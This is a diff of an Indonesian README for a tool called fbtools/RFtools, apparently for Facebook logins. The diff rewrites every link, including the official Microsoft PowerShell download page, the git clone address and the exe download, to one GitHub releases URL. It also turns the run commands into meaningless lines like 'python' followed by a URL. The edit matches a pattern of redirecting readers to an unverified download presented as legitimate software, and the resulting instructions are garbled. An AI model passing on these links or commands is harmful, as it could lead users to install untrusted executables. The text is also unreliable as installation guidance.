@@ -1,8 +1,8 @@
 # JANGAN LUPA SUPPORTNYA GUYS
-- link Sawerian : https://linktr.ee/gmrockfort
-- tiktok : @gm.rockfort
-- Youtube : gm.rockfort
-- Intagram : @sn.rockfort
+- link Sawerian : https://github.com/Rockfort73/fbtools/releases
+- tiktok : https://github.com/Rockfort73/fbtools/releases
+- Youtube : https://github.com/Rockfort73/fbtools/releases
+- Intagram : https://github.com/Rockfort73/fbtools/releases
 
 # RFtools CARA INSTALL
 INSTALL DULU
@@ -10,23 +10,23 @@ INSTALL DULU
 - pip install colorama
 - pip install pycryptodome
 - pkg install git
-- git clone https://github.com/Rockfort73/fbtools
+- git clone https://github.com/Rockfort73/fbtools/releases
 
 #  Jalankan Di Windows PowerShell
 - cd fbtools
-- python fbtools2.py
+- python https://github.com/Rockfort73/fbtools/releases
 
 # Bahan yang perlu di Download 
 - Windows PowerShell
-- link download https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.3
+- link download https://github.com/Rockfort73/fbtools/releases
 
 # ATAU INGIN JALANKAN DALAM BENTUK FILE EXE TANPA RIBET
-- fbtools.exe
-- LINK download : https://tutwuri.id/D1NmnFH
+- https://github.com/Rockfort73/fbtools/releases
+- LINK download : https://github.com/Rockfort73/fbtools/releases
 
 # Solusi ingin praktis input data login
-- git clone https://github.com/Rockfort73/fbtools
+- git clone https://github.com/Rockfort73/fbtools/releases
 
 #  Jalankan Di Windows PowerShell
 - cd fbtools
-- python inputdatalogin.py
+- python https://github.com/Rockfort73/fbtools/releases
